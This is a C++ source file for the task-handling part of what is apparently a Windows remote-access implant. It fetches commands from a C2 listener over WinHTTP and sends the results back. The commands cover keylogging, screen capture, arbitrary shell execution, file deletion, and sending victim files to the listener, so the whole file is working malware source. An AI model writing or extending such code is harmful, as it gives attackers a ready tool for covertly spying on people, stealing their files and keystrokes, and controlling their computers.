#include "task.hpp"

std::wstring GetTask(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath
) {
	std::wstring task;
	HINTERNET hRequest = NULL;

	WinHttpResponse resp = SendRequest(
		hConnect,
		lpHost,
		nPort,
		lpPath,
		L"GET",
		NULL,
		NULL,
        0
	);
	if (!resp.bResult || resp.dwStatusCode != 200)
	{
		return task;
	}

	hRequest = resp.hRequest;

	task = ReadResponseText(hRequest);
	return task;
}

std::wstring ExecuteTaskCat(const std::wstring& wFile)
{
    return MyReadFileW(wFile);
}

std::wstring ExecuteTaskCd(const std::wstring& wDestDir)
{
    if (!SetCurrentDirectoryW(wDestDir.c_str()))
    {
        return L"Error: Could not change current directory.";
    }
    return L"Current directory changed successfully.";
}

std::wstring ExecuteTaskCp(const std::wstring& wSrc, const std::wstring& wDest)
{
    if (!CopyFileW(wSrc.c_str(), wDest.c_str(), TRUE))
    {
        return L"Error: Could not copy the file.";
    }
    return L"File copied successfully.";
}

std::wstring ExecuteTaskDownload(
    HINTERNET hConnect,
    const std::wstring& wSrc,
    const std::wstring& wDest
) {    
    MyFileData myFileData;
	std::wstring wHeaders;
    WinHttpResponse resp;

    myFileData = MyReadFileExW(wSrc);

    // Set additional headers.
    // Specify the destination file path in the server-side.
	wHeaders = L"X-FILE: " + wDest;

	resp = SendRequest(
		hConnect,
		LISTENER_HOST_W,
		LISTENER_PORT,
		REQUEST_PATH_UPLOAD_W,
		L"POST",
		wHeaders.c_str(),
		myFileData.lpData,
        myFileData.dwDataSize
	);
	if (!resp.bResult || resp.dwStatusCode != 200)
	{
		return L"Error: Could not upload a file.";
	}

    return wDest.c_str();
}

std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime) {
    INT nLogTime = std::stoi(wLogTime);
    return KeyLog(nLogTime);
}

std::wstring ExecuteTaskLs(const std::wstring& wDir) {
    std::wstring result;

    DWORD dwRet;
    WIN32_FIND_DATAW ffd;
    LARGE_INTEGER filesize;
    std::wstring wFilesize;
    WCHAR wTargetDir[MAX_PATH];
    size_t dirLength;
    WCHAR wBuffer[MAX_PATH];
    WCHAR** lppPart = {NULL};
    HANDLE hFind = INVALID_HANDLE_VALUE;

    StringCchLengthW(wDir.c_str(), MAX_PATH, &dirLength);
    if (dirLength > MAX_PATH)
    {
        return L"Error: Directory path is too long.";
    }

    StringCchCopyW(wTargetDir, MAX_PATH, wDir.c_str());
    StringCchCatW(wTargetDir, MAX_PATH, L"\\*");

    // Find the first file in the directory.
    hFind = FindFirstFile(wTargetDir, &ffd);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        return L"Error: Could not find the first file in the directory.";
    }

    // Get the directory (absolute) path
    dwRet = GetFullPathNameW(
        wTargetDir,
        MAX_PATH,
        wBuffer,
        lppPart
    );
    if (dwRet == 0)
    {
        return L"Error: Could not get current directory.";
    }
    std::wstring wDirPath = std::wstring(wBuffer);
    result += std::wstring(L"Directory: ");
    result += std::wstring(wDirPath);
    result += std::wstring(L"\n\n");
    
    // List all files in the directory
    do
    {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            result += std::wstring(L"<D> ");
            result += std::wstring(ffd.cFileName);
            result += std::wstring(L"\n");
        }
        else
        {
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            wFilesize = std::to_wstring(filesize.QuadPart);

            result += std::wstring(L"<F> ");
            result += std::wstring(ffd.cFileName);
            result += std::wstring(L", ");
            result += wFilesize;
            result += std::wstring(L" bytes\n");
        }
    } while (FindNextFileW(hFind, &ffd) != 0);

    FindClose(hFind);
    return result;
}

std::wstring ExecuteTaskMkdir(const std::wstring& wDir)
{
    if (!CreateDirectoryW(wDir.c_str(), NULL))
    {
        return L"Error: Could not create a new directory.";
    }

    return L"A new directory has been created successfully.";
}

std::wstring ExecuteTaskPwd()
{
    WCHAR wBuffer[MAX_PATH];
    DWORD dwRet;

    dwRet = GetCurrentDirectoryW(MAX_PATH, wBuffer);
    if (dwRet == 0 || dwRet > MAX_PATH)
    {
        return L"Error: Could not get current directory.";
    }
    
    return std::wstring(wBuffer);
}

std::wstring ExecuteTaskRm(const std::wstring& wFile)
{
    if (!DeleteFileW(wFile.c_str()))
    {
        return L"Error: Could not delete a file.";
    }

    return L"A file has been deleted successfully.";
}

std::wstring ExecuteTaskRmdir(const std::wstring& wDir)
{
    if (!RemoveDirectoryW(wDir.c_str()))
    {
        return L"Error: Could not delete a directory.";
    }

    return L"A directory has been deleted successfully.";
}

std::wstring ExecuteTaskScreenshot(HINSTANCE hInstance, INT nCmdShow)
{
    return Screenshot(hInstance, nCmdShow);
}

std::wstring ExecuteTaskShell(const std::wstring& cmd) {
    std::wstring result;

    result = ExecuteCmd(cmd);
    if (wcscmp(result.c_str(), L"") == 0)
    {
        return L"The command seems to have executed successfully.";
    }
    return result;
}

std::wstring ExecuteTaskSleep(
    const std::wstring& wSleepTime,
    INT &nSleep
) {
    INT newSleepTime = std::stoi(wSleepTime);
    nSleep = newSleepTime;
    return L"The sleep time updated successfully.";
}

std::wstring ExecuteTaskUpload(
    HINTERNET hConnect,
    const std::wstring& wSrc,
    const std::wstring& wDest
) {
    std::string sSrc = ConvertWstringToString(wSrc);

    // Download a specified file from the C2 server.
    BOOL bResult = DownloadFile(
	    hConnect,
	    LISTENER_HOST_W,
	    LISTENER_PORT,
	    REQUEST_PATH_DOWNLOAD_W,
        wSrc,
        wDest
    );
    if (!bResult)
    {
        return L"Error: Could not download a file.";
    }

    return wDest.c_str();
}

std::wstring ExecuteTaskWhoami()
{
    std::wstring result;

    WCHAR wInfoBuf[INFO_BUFFER_SIZE] = {'\0'};
    DWORD dwBufCharCount = INFO_BUFFER_SIZE;

    if (!GetComputerNameW(wInfoBuf, &dwBufCharCount))
    {
        return L"Error: Could not get the computer name.";
    }

    result += std::wstring(wInfoBuf);
    dwBufCharCount = INFO_BUFFER_SIZE;
    
    if (!GetUserNameW(wInfoBuf, &dwBufCharCount))
    {
        return L"Error: Could not get the username.";
    }

    result += std::wstring(L"\\");
    result += std::wstring(wInfoBuf);

    return result;
}

std::wstring ExecuteTask(
    HINSTANCE hInstance,
    INT nCmdShow,
    HINTERNET hConnect,
	const std::wstring& task,
	INT &nSleep
) {
	// If no task, return immediatly.
	if (wcscmp(task.substr(0, 4).c_str(), L"cat ") == 0)
	{
		return ExecuteTaskCat(task.substr(4, task.size()));
	}
	else if (wcscmp(task.substr(0, 3).c_str(), L"cd ") == 0)
	{
		return ExecuteTaskCd(task.substr(3, task.size()));
	}
    else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
    {
        // Parse arguments.
        std::vector<std::wstring> wArgs = SplitW(task, L' ');
        if (wArgs.size() != 3)
        {
            return L"Error: Invalid argument.";
        }
        std::wstring wSrc = wArgs[1];
        std::wstring wDest = wArgs[2];

        return ExecuteTaskCp(wSrc, wDest);
    }
    else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
    {
        // Parse arguments.
        std::vector<std::wstring> wArgs = SplitW(task, L' ');
        if (wArgs.size() != 3)
        {
            return L"Error: Invalid argument.";
        }
        std::wstring wSrc = wArgs[1];
        std::wstring wDest = wArgs[2];

        return ExecuteTaskDownload(
            hConnect,
            wSrc,
            wDest
        );
    }
	else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
	{
		return ExecuteTaskKeyLog(task.substr(7, task.size()));
	}
	else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
	{
		return ExecuteTaskLs(task.substr(3, task.size()));
	}
    else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
    {
        return ExecuteTaskMkdir(task.substr(6, task.size()));
    }
	else if (wcscmp(task.c_str(), L"pwd") == 0)
	{
		return ExecuteTaskPwd();
	}
    else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
    {
        return ExecuteTaskRm(task.substr(3, task.size()));
    }
    else if (wcscmp(task.substr(0, 6).c_str(), L"rmdir ") == 0)
    {
        return ExecuteTaskRmdir(task.substr(6, task.size()));
    }
	else if (wcscmp(task.c_str(), L"screenshot") == 0)
	{
		return ExecuteTaskScreenshot(hInstance, nCmdShow);
	}
	else if (wcscmp(task.substr(0, 6).c_str(), L"shell ") == 0)
	{
		return ExecuteTaskShell(task.substr(6, task.size()));
	}
	else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
	{
		return ExecuteTaskSleep(task.substr(6, task.size()), nSleep);
	}
    else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
    {
        // Parse arguments.
        std::vector<std::wstring> wArgs = SplitW(task, L' ');
        if (wArgs.size() != 3)
        {
            return L"Error: Invalid argument.";
        }
        std::wstring wSrc = wArgs[1];
        std::wstring wDest = wArgs[2];

        return ExecuteTaskUpload(
            hConnect,
            wSrc,
            wDest
        );
    }
	else if (wcscmp(task.c_str(), L"whoami") == 0)
	{
		return ExecuteTaskWhoami();
	}
	else
	{
		return L"Invalid task.";
	}
}

BOOL SendTaskResult(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	const std::wstring& task,
	const std::wstring& taskResult
) {
    std::string sTaskResult;
    WinHttpResponse resp;

	if (wcscmp(taskResult.c_str(), L"") == 0) {
		return FALSE;
	}

	// Prepare additional headers
	std::wstring wHeaders;
	wHeaders = L"X-Task: " + task + L"\r\n";

    sTaskResult = ConvertWstringToString(taskResult);

    // When the "screenshot" task, read bytes of the captured image file and send them.
    if (wcscmp(task.c_str(), L"screenshot") == 0)
    {
        // Load a captured image file
        std::vector<BYTE> imgData = MyReadFileToByteArray(sTaskResult);

        // Delete the image file
        MyDeleteFileW(taskResult.c_str());

        resp = SendRequest(
            hConnect,
            lpHost,
            nPort,
            lpPath,
            L"POST",
            wHeaders.c_str(),
            (LPVOID)imgData.data(),
            (DWORD)imgData.size()
        );
    }
    else
    {
        resp = SendRequest(
            hConnect,
            lpHost,
            nPort,
            lpPath,
            L"POST",
            wHeaders.c_str(),
            (LPVOID)sTaskResult.c_str(),
            (DWORD)strlen(sTaskResult.c_str())
        );
    }


	if (!resp.bResult || resp.dwStatusCode != 200)
	{
		return FALSE;
	}

	return TRUE;
}